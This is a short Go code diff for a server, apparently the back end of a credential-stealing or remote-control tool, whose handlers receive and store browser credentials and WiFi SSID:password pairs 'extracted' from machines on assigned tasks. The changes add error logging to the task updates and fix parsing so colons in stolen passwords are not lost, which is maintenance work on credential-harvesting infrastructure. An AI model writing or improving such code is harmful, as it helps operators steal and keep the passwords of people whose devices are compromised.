@@ -2,6 +2,7 @@ package server
 
 import (
 	"fmt"
+	"log/slog"
 	"net/http"
 	"strings"
 	"time"
@@ -113,10 +114,12 @@ func (s *Server) handleProcessBrowserResult(c *gin.Context) {
 	}
 
 	// Update task
-	s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
+	if err := s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
 		"status": "completed",
 		"result": fmt.Sprintf("Extracted %d browser credentials", created),
-	})
+	}).Error; err != nil {
+		slog.Error("Failed to update browser creds task", "task_id", req.TaskID, "err", err)
+	}
 
 	c.JSON(http.StatusOK, gin.H{
 		"success": true,
@@ -141,8 +144,8 @@ func (s *Server) handleProcessWifiResult(c *gin.Context) {
 	// Parse and store WiFi credentials
 	created := 0
 	for _, network := range req.Networks {
-		// Format: SSID:Password
-		parts := strings.Split(network, ":")
+		// Format: SSID:Password — limit to 2 so colons in password aren't lost
+		parts := strings.SplitN(network, ":", 2)
 		if len(parts) < 2 {
 			continue
 		}
@@ -164,10 +167,12 @@ func (s *Server) handleProcessWifiResult(c *gin.Context) {
 	}
 
 	// Update task
-	s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
+	if err := s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(map[string]interface{}{
 		"status": "completed",
 		"result": fmt.Sprintf("Extracted %d WiFi credentials", created),
-	})
+	}).Error; err != nil {
+		slog.Error("Failed to update wifi creds task", "task_id", req.TaskID, "err", err)
+	}
 
 	c.JSON(http.StatusOK, gin.H{
 		"success": true,
